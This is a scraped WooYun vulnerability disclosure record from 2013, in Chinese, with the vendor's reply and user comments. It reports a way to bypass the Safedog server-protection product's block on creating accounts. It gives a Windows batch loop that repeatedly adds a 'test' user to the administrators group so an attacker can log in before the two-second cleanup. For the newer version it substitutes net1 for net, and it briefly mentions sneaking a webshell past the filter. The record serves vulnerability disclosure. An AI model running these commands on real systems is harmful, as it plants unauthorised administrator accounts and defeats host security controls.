{"id": 7461, "wybug_id": "wooyun-2013-037294", "wybug_title": "新老版本安全狗拦截添加账户存在绕过漏洞(对抗技巧)", "wybug_corp": "安全狗", "wybug_author": "Mas", "wybug_date": "2013-09-16 16:53", "wybug_open_date": "2013-12-15 16:54", "wybug_type": "权限提升", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["绕过", "安全狗", "添加账户"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-15：\t细节向公众公开  简要描述： 安全狗拦截添加账户 简单突破 详细说明：  直接在命令行下使用for /l %i in (1,1,1000) do @net user test test /add&@net localgroup administrators test /add 另存为 ad.bat 使用for /l %%i in (1,1,1000) do @net user test test /add&@net localgroup administrators test /add 命令的意思是循环一千次执行do后面的命令add user要说一下安全狗拦截添加用户的原理老版本安全狗的拦截并不是真正意义上的拦截，而是每2秒钟检测一次是否有新添加的用户，如果有新用户，则删除。所以我们直接net user test test /add 是能够成功添加用户的，只不过两秒后被安全狗删除了而已。上面的命令是不断的重复加用户的操作，直到1000次，大概两分钟就会执行完毕自动退出{远程登录test后，无论test是否已经被删除，都不会受到影响}，如果需要无限循环，将括号内的数字改为(1,0,1)即可，然后记得要手动停止新版本安全狗直接禁用net 不过net1还是可以调用 所以直接net1 user xxx xxx 可以顺利执行    漏洞证明：  新版本安全狗禁用了netnet1照样可以执行\n\n\n\n\n\n\n\n\n\n\n\n老版本先用<!--#include file=\"xxx.xxx\"--> 跳转方法过安全狗webshell拦截利用exp提升权限 但是无法添加用户 用系统权限执行for /l %i in (1,1,1000) do @net user test test /add&@net localgroup administrators test /add  只要在安全狗删除的2秒前登陆 之后账号被删了也没关系 \n\n\n\n\n\n\n\n\n\n登陆成功以后 看账户是没有的 因为已经被删了 但是登陆以后就是我们说了算了~   修复方案：  你懂的   版权声明：转载请注明来源 Mas@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-09-16 21:47 厂商回复： 该问题之前网上已经被公开过了，4.0版本如果保护用户组全选情况下，是无法添加成功的官方会在下个版本再做些优化也感谢您的再次反馈可以关注官方的应急响应中心security.safedog.cn积分可兑换奖品 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-16 17:18 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  哎~呀~我~去~    \n     2013-09-20 01:21 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  乌云集市跟安全狗积分商场比起来，真是业绩良心。    \n     2013-09-20 10:04 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  120个严重级别的漏洞才换个air，你们是对自己的产品有多不放心？    \n     2013-09-20 10:58 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @p.z 哈哈 他们跟我说他们中秋以后会调解积分策略的     \n     2013-10-08 09:15 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  利用什么exp提升权限？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}